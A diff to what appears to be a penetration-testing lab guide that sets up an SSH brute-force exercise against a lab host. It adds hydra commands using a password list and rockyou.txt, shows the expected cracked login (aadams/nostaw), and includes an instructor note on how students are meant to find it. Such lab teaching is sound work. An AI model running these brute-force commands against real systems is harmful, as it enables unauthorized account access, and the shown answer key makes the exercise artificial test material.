@@ -113,9 +113,8 @@ root
 admin
 EOF
 
-# Password list
+# Password list (common passwords)
 cat > passwords.txt << 'EOF'
-nostaw
 password
 password123
 123456
@@ -126,18 +125,43 @@ bbanter
 ccoffee
 ddeeds
 eeikman
+company
+deice
+2003
+2004
+security
+welcome
+letmein
 EOF
+
+# For more comprehensive attack, use rockyou.txt
+# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.3 ssh -t 4
 ```
 
 ### SSH Brute Force Attack
+
+**Basic Attack (likely to fail with common passwords):**
 ```bash
 hydra -L users.txt -P passwords.txt 172.20.0.3 ssh -t 4
+```
+
+**Advanced Attack (required for success):**
+```bash
+# Use comprehensive wordlist
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.3 ssh -t 4
 ```
 
 **Expected Successful Credential:**
 ```
 [22][ssh] host: 172.20.0.3   login: aadams   password: nostaw
 ```
+
+**Note for Instructors:** The password "nostaw" (watson backwards) will only be discovered through:
+1. Using comprehensive wordlists like rockyou.txt
+2. Context-based password generation (if students notice patterns)
+3. Social engineering research (if conducting OSINT on employees)
+
+This teaches students that basic password lists often fail and more sophisticated approaches are needed.
 
 ### SSH Access and Exploration
 ```bash
